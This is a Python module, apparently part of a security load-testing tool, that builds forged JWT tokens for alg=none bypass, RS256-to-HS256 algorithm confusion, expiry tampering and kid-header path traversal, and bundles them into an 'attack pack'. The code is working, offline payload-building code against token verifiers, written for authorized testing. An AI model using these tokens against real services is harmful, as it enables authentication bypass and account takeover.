"""
JWT attack payload builders (offline, no network).

Lets a security-aware load test poke common JWT misconfigurations:
- ``alg=none`` token bypass
- RS256 → HS256 algorithm confusion (using the public key as HMAC secret)
- Expiry tampering

All functions return **strings** ready to drop into an ``Authorization``
header; they do not contact any service.
"""

import base64
import hashlib
import hmac
import json
import time
from typing import Any, Dict, Optional


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _encode_part(value: Dict[str, Any]) -> str:
    return _b64url(json.dumps(value, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def craft_alg_none_token(claims: Dict[str, Any]) -> str:
    """Build a ``{"alg":"none"}`` JWT with the given claims (empty signature)."""
    header = _encode_part({"alg": "none", "typ": "JWT"})
    body = _encode_part(claims)
    return f"{header}.{body}."


def craft_alg_confusion_token(claims: Dict[str, Any], public_key_pem: str) -> str:
    """
    Build an HS256 JWT signed with the RSA public key bytes — the classic
    RS256/HS256 algorithm-confusion payload.
    """
    header = _encode_part({"alg": "HS256", "typ": "JWT"})
    body = _encode_part(claims)
    signing_input = f"{header}.{body}".encode("ascii")
    secret = public_key_pem.encode("utf-8")
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{_b64url(signature)}"


def craft_expired_token(
    claims: Dict[str, Any],
    secret: str,
    seconds_ago: int = 3600,
) -> str:
    """Build an HS256 JWT with ``exp`` set ``seconds_ago`` in the past."""
    expired_claims = dict(claims)
    expired_claims["exp"] = int(time.time()) - max(0, int(seconds_ago))
    header = _encode_part({"alg": "HS256", "typ": "JWT"})
    body = _encode_part(expired_claims)
    signing_input = f"{header}.{body}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{_b64url(signature)}"


def craft_kid_traversal_token(
    claims: Dict[str, Any],
    kid_path: str = "../../dev/null",
    secret: str = "",  # nosec B107 - no secret means a placeholder key; these are probe tokens
) -> str:
    """JWT with a ``kid`` header that attempts path traversal."""
    header = _encode_part({"alg": "HS256", "typ": "JWT", "kid": kid_path})
    body = _encode_part(claims)
    signing_input = f"{header}.{body}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8") or b"x", signing_input, hashlib.sha256).digest()
    return f"{header}.{body}.{_b64url(signature)}"


def craft_attack_pack(
    claims: Dict[str, Any],
    public_key_pem: Optional[str] = None,
    hmac_secret: str = "",  # nosec B107 - no secret means a placeholder key; these are probe tokens
) -> Dict[str, str]:
    """Return a dict of attack-type → token string."""
    pack: Dict[str, str] = {
        "alg_none": craft_alg_none_token(claims),
        "expired": craft_expired_token(claims, hmac_secret or "x"),
        "kid_traversal": craft_kid_traversal_token(claims, secret=hmac_secret),
    }
    if public_key_pem:
        pack["rs_to_hs_confusion"] = craft_alg_confusion_token(claims, public_key_pem)
    return pack
